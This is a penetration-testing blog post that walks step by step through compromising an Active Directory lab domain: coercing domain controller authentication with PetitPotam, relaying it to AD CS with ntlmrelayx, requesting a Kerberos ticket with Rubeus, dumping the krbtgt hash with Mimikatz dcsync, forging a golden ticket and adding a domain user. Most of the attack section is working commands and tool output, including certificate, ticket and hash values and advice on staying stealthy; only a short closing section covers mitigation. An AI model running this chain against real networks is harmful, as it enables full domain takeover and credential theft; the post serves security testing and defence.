---
layout: single
title: Coerced NTLM relay attack using Petitpotam, Ntlmrelayx and Mimikatz
date: '2021-08-06 19:42:26'
tags:
- pentest
classes: wide
typora-copy-images-to: ../images/posts/2020/${filename}/
---
There has been a lot of noise in the InfoSec community about this attack, which links a coerced NTLM relay attack and a weakness in the default Active Directory Certificate Services configuration discovered by [SpecterOps](https://posts.specterops.io/certified-pre-owned-d95910965cd2) that allows an attacker to compromise a domain. 

## Preparation

To begin with a number of tools are required which need to be downloaded as they aren't (currently) included in pentesting distros, such as Kali.

### PetitPotam

This is the tool that allows you to coercre an authentication from a Windows host via via MS-EFSRPC. Coerceing an authentication is nice as often you would need to have a Man in the Middle (MitM) position to capture NTLM authentications for relay. No credentials are required.

More information can be found at https://github.com/topotam/PetitPotam

You will need to clone this repository to get the tool

`git clone https://github.com/topotam/PetitPotam.git`

### NTLMRelayx

NTLMRekayx is part of [Impacket](https://github.com/SecureAuthCorp/impacket), a set of Python classes for working with network protocols. 

The current release version of NTLMRelayx that will be present on Kali etc. does not have the ADCS relay functionality built in. This was developed by [ExAndroidDev](https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/), so you need to patch their pull request in or use their fork. The example below uses their fork.

```bash
wget https://github.com/ExAndroidDev/impacket/archive/refs/heads/ntlmrelayx-adcs-attack.zip
unzip impacket-ntlmrelayx-adcs-attack.zip
cd impacket-ntlmrelayx-adcs-attack
virtualenv -p python3 .
source ./bin/activate
python3 setup.py install
```

Virtualenv is used to create an isolated Python environment to install this fork of Impacket. If this isn't done it will trample over your existing install, which may cause fun problems later.

### Rubeus

[Rubeus](https://github.com/GhostPack/Rubeus) is a Windows tool for using and abusing Kerberos. The code needs to be downloaded from the Github repository and then compiled. You can use [Visual Studio Community 2019](https://visualstudio.microsoft.com/vs/community/), which is free, to do this.

### Mimikatz

[Mimikatz](https://github.com/gentilkiwi/mimikatz) is the go-to tool for abusing Windows authentication, among other things. You can grab a compiled release from the Github repository, though it will need to be run on a system you control with the Antivirus switched off, as **everything** detects it as malware in it's default state.

## The attack

### Coerce authentication and relay to ADCS

In this example, **192.168.68.200** is the box I'm running the exploit from, and that will be running NTLMrelayx. **192.168.68.10** is a Domain Controller.

```bash
python3 Petitpotam.py 192.168.68.200 192.168.68.10 
```

In a seperate window on the attack box in the location you created the Python virtual environment run:

```bash
source ./bin/activate
python3 ./ntlmrelayx.py -t http://192.168.68.3/certsrv/certfnsh.asp -smb2support --adcs --template "Domain Controller"
```

**192.168.68.3** is the server running ADCS. The --template related to the certificate template on ADCS. Some examples I've seen use *workstation* but this didn't work for me.

If the attack works, you will get something like

```bash
Impacket v0.9.24.dev1 - Copyright 2021 SecureAuth Corporation

[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections
[*] SMBD-Thread-4: Connection from ACHILLEANTEST/DC1$@192.168.68.10 controlled, attacking target http://192.168.68.3
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://192.168.68.3 as ACHILLEANTEST/DC1$ SUCCEED
[*] SMBD-Thread-4: Connection from ACHILLEANTEST/DC1$@192.168.68.10 controlled, attacking target http://192.168.68.3
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://192.168.68.3 as ACHILLEANTEST/DC1$ SUCCEED
[*] SMBD-Thread-4: Connection from ACHILLEANTEST/DC1$@192.168.68.10 controlled, attacking target http://192.168.68.3
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://192.168.68.3 as ACHILLEANTEST/DC1$ SUCCEED
[*] SMBD-Thread-4: Connection from ACHILLEANTEST/DC1$@192.168.68.10 controlled, attacking target http://192.168.68.3
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://192.168.68.3 as ACHILLEANTEST/DC1$ SUCCEED
[*] SMBD-Thread-4: Connection from ACHILLEANTEST/DC1$@192.168.68.10 controlled, attacking target http://192.168.68.3
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://192.168.68.3 as ACHILLEANTEST/DC1$ SUCCEED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE!
[*] Base64 certificate of user DC1$: 
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
[*] GOT CERTIFICATE!
```

At this point you have a certificate that will allow you to authenticate the DC1 computer account, which means the domain is lost.

#### Warning!

When running this attack PetitPotam will keep coercing authentications and relaying them so you can end up with multiple certificates being generated for the same computer account quite quickly, which is pretty obvious (if anyone looks?!). You need to kill the tools off after grabbing the certificate initially, if you want to be semi stealthy.

### Getting a kerberos ticket

Now that we can authenticate as DC1$ we want to get a kerberos ticket for this account which will allow us to run Mimikatz. We use Rubeus to do this.

In my test lab I did this from a domain joined Windows 10 desktop.

The format of the command is `Rubeus.exe asktgt /user:dc1$ /certificate:<base64_encoded_cert> /ptt`

asktgt requests a ticket granting ticket for the dc1$ user (the domain controller computer account) and provides the certificate we got from the relay attack as the credentials. The `/ptt` means **pass the ticket** and will apply the Kerberos credential to the current session. So in this case the Administrator user on my desktop will be able to request tickets as if they were dc1$

When run you should see something like:

```
______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=DC1.achilleantest.local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'achilleantest.local\dc1$'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIF1DCCBdCgAwIBBaEDAgEWooIE2DCCBNRhggTQMIIEzKADAgEFoRUbE0FDSElMTEVBTlRFU1QuTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE2FjaGlsbGVhbnRlc3QubG9jYWyjggSCMIIEfqADAgESoQMCAQKiggRwBIIEbK8CloRfCQ6wvh/29vQXGrMv4tfzuuYlK0sle0Y1pKxkaTGID3EFWKMQgq0moZ3yQYjhTrYz4/p5XV8dtKT/eHl8ewlZUq52RVKWLmmcLrCY32Mb3vJDFDOTwzsVgLW3i7hEYpgFx4qnNH3op23oaCkLG9OpZNaVYOGQ1kWJ/qWeTfUNOneleLbqYAAos3Cpqkjfy8xR0ZaPbqz4y6KvE5BjqlbrnIoW2uyKv1To3bg4xNQEkt7Aouqt+a6/vERpyp2yRFIgckSLTth23wJbohRJF+Q8fItJOwbYBnOkcbBE+oZMyknk4hcdhN1byi1q+E1GMG6eXhql6CsDfAS13ME9w9T/XSkVZqcoH5R/mlWjC0/GP1whVElPs46AoBL9UWImFk99dULCg8oUdtO3crQiy0UiamsnRhfxY9LruLnFVHtY08pzujyS5apfY3x5ecd9gKGIgelXYUS1Nfwxe+Yavc1+OpCSqligNvAqcBrV7RyceBalNGt0/Wq5tKzrdL/hdDRs2quGdVzcCQ1sqn3J1y0ai5QaoPhM
5GeHljhY52kkVW1qGuhHMWeaGBM6tNyNotOdpGqnsgo3n3v04WX60Y8ULtT0VI7YiJrkzTS4m9rfrwiNPIKFNqOCtX0DSwlF+DR16F7bHEWfUZ1gtDIwd6wXddPgLDd3l9vo/3SnAmQpo94HXc0XFfesHOMf+lMuMyXCEjJiemwmR5cXhVXNht3+yUZt460zv4zDsK2X/k24TaUaEg0Cy93vMyT6O0p8Oht5AkxoUckRRQn7JZ/JicsWhpPSBBMfPbTu/jj8HQRKmTeddIBV53Thfi7cpOyqRsfiPYgtxs1OjTwzfvSqnqpmkIn9Vt+/10fkwkhNdmMjFNIVMiIblfCm0huwdcUB8zCHr2aocHlOwxcaYh3YyCuP1PrR6IWr9Qd3MbZfYWVOWa/crMuLW+PFZDzUegUpVYW6WFWAMKXcnoUzzpi2bVaa7RsaDW7YE4Ha21N8Am4qZxCYtSrrTOB/6MQBJk3qM2vi0HqDd9NksEjAZxAKV0R8kHU48PUOYv1sHFkrn5v9oP6Zo/i0FBgIMad7GMrnzJDqpVHaviJ16MY6PZe3VOPwMJ+a5TMZjlL1B0a9uSnHKUtRBJ2WCBiWCn1/CmrXTpByVgl1pQ497nqgrw51WcaOgsDVUgFPZntQZOO1euqyOuCOag8nipdgIOv891hyZKDZrAR4NDHudglohBv5rLKKewqFLp438nDspMImy8PHam5bQDXw6zcSDsgbGdrLYRqkNnCfyBx/u/17SBnEZ6I7fTUB4yjl3qieyTbwC17P5F0DOFbIGYabkEUjLq73vzv7Xm4SRKq5Bjf7yRxJ0TiO2nt7+UxXC1ZmCgPmniU9cP1ECS1tujkxa5YzJPeiLgHA77kU8hlrzQSpsB+V4Y3EtpC4Uk4Tfwgh7VN4Y+rGD0QYGlw0wJ4P6UegjPOR02fXpyrti+OhZMGbu9dHuWEDv8Y7kpRKKjGjgecwgeSgAwIBAKKB3ASB2X2B1jCB06CB0DCBzTCByqAbMBmgAwIBF6ESBBBiEJbGtu4P9jjXh11po/CIoRUbE0FDSElMTEVBTlRFU1QuTE9DQUyiETAoAMCAQGhCDAGGwRkYzEkowcDBQBA4QAApREYDzIwMjEwODAxMTYxODQ2WqYRGA8yMDIxMDgwMjAyMTg0NlqnERgPMjAyMTA4MDgxNjE4NDZaqBUbE0FDSElMTEVBTlRFU1QuTE9DQUypKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE2FjaGlsbGVhbnRlc3QubG9jYWw=
[+] Ticket successfully imported!

  ServiceName           :  krbtgt/achilleantest.local
  ServiceRealm          :  ACHILLEANTEST.LOCAL
  UserName              :  dc1$
  UserRealm             :  ACHILLEANTEST.LOCAL
  StartTime             :  01/08/2021 17:18:46
  EndTime               :  02/08/2021 03:18:46
  RenewTill             :  08/08/2021 17:18:46
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  rc4_hmac
  Base64(key)           :  YhCWxrbuD/Y414ddaaPwiA==
```
At this point we can run klist to see what Kerberos tickets we have
```
C:\Users\Administrator.achilleantest\Desktop>klist
Current LogonId is 0:0x29501

Cached Tickets: (1)

#0>     Client: dc1$ @ ACHILLEANTEST.LOCAL
        Server: krbtgt/achilleantest.local @ ACHILLEANTEST.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 8/1/2021 17:18:46 (local)
        End Time:   8/2/2021 3:18:46 (local)
        Renew Time: 8/8/2021 17:18:46 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

### Mimikatz dcsync

Now we have a tgt ticket for dc1$ we can use Mimikatz to perform a [dcsync](https://adsecurity.org/?p=1729) attack. This allows us to get the KRBTGT account hash without having access to the Domain Controller. With this hash it's possible to create [Golden Tickets](https://attack.mitre.org/techniques/T1558/001/), which gives complete control of the AD Domain. 

First we do the dcsync:

```
C:\Users\Administrator.achilleantest\Desktop\Mimikatz\x64>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Jul 29 2021 11:16:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /user:krbtgt
[DC] 'achilleantest.local' will be the domain
[DC] 'DC1.achilleantest.local' will be the DC server
[DC] 'krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 01/08/2021 14:05:41
Object Security ID   : S-1-5-21-3553360538-1659965901-2675215416-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 756976f83b1b576290c91fbc331094e6
    ntlm- 0: 756976f83b1b576290c91fbc331094e6
    lm  - 0: ff2aa41f510036e83c251c3b3ad53425

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : ac1b4d4b765e891a9d396faa9bea7fb1

* Primary:Kerberos-Newer-Keys *
    Default Salt : ACHILLEANTEST.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 8ca9344bf9dd66f72903ce9462b7bccd03815df8deb60087ceed1b0165b2d9a8
      aes128_hmac       (4096) : e4c740a1beeb4a43811a27a302eb1afc
      des_cbc_md5       (4096) : 6e46263b617902bf

* Primary:Kerberos *
    Default Salt : ACHILLEANTEST.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 6e46263b617902bf

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  887c8ef9745cb0a936d03bb11ebcca6b
    02  55452cd2e808c16f246fa87b19781049
    03  4ebbfffca75f223d5de67baae2543644
    04  887c8ef9745cb0a936d03bb11ebcca6b
    05  55452cd2e808c16f246fa87b19781049
    06  e83d6d6d62161bfbaab1f68de4b0a92d
    07  887c8ef9745cb0a936d03bb11ebcca6b
    08  a1a4f8f1c9b821d2ddb86d01c43d47c7
    09  a1a4f8f1c9b821d2ddb86d01c43d47c7
    10  0ef60913364c07efa4e04ff43c4148d8
    11  c84551cd86f84746334a74310cfc3dbe
    12  a1a4f8f1c9b821d2ddb86d01c43d47c7
    13  778070d096b25402f404424fc7cfbf47
    14  c84551cd86f84746334a74310cfc3dbe
    15  16d4668b4050c078953f228e0aa6a15c
    16  16d4668b4050c078953f228e0aa6a15c
    17  1b68bcbd2b140c57ff3a773b3019c252
    18  ed3e4f703a6cab0e55de7f0b47f2f166
    19  d931afc2218e8e8bd5225a44148fa5d3
    20  dc7cfd5438e483fecfd02ad31931b8ad
    21  20ed551a78af83f09c5fe33b4af54d61
    22  20ed551a78af83f09c5fe33b4af54d61
    23  4e99e2a57464ec0ade44e13e268e1d60
    24  fe9cdf7194f05408c7648ea097cb304d
    25  fe9cdf7194f05408c7648ea097cb304d
    26  72e6e8284c18a67ee809382e87bc7122
    27  8615ebe057e93c4608e975952b57abab
    28  dcaf25782d9aa7c0178eb6b33d6255c0
    29  38fdadc79fa1a13ffb4ed241ea6a035d
```

Next we can generate the golden ticket.

In the command below we have the arguments:

-  */user* is the user we want to impersonate, in this case the default Domain Administrator account.
- */domain* is the domain we want to operate against
- */sid* is the Object Security ID for the KRBTGT account that can be see above.
- */rc4* is the Hash NTLM from above
- */id* is the RID to impersonate. The built in administrator has the RID of 500
- */ptt* means "pass the ticket" again and will put the Kerberos credential into our running session

```
mimikatz # kerberos::golden /user:administrator /domain:achilleantest.local /sid:S-1-5-21-3553360538-1659965901-2675215416 /rc4:756976f83b1b576290c91fbc331094e6 /id:500 /ptt
User      : administrator
Domain    : achilleantest.local (ACHILLEANTEST)
SID       : S-1-5-21-3553360538-1659965901-2675215416
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 756976f83b1b576290c91fbc331094e6 - rc4_hmac_nt
Lifetime  : 01/08/2021 17:53:04 ; 30/07/2031 17:53:04 ; 30/07/2031 17:53:04
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'administrator @ achilleantest.local' successfully submitted for current session
```

We can then use Mimikatz to spawn us a shell in the context of the ticket we requested
```
mimikatz # misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF6206C63D8
```
In this shell we are running as the default Administrator account and so can do pretty much anything. As an example you can create a domain user, though this is noisy so wouldn't normally be recommended!

```
C:\Users\Administrator.achilleantest\Desktop\Mimikatz\x64>net user test wibble73476436! /domain /add
The password entered is longer than 14 characters.  Computers
with Windows prior to Windows 2000 will not be able to use
this account. Do you want to continue this operation? (Y/N) [Y]: y
The request will be processed at a domain controller for domain achilleantest.local.

The command completed successfully.
```

## Mitigations

Microsoft have updated their guidance around how to defend against this attack at https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429

This is in addition to the usual advice of "Disable NTLM" though this often isn't trivial to do in any environment that has been around for a while.

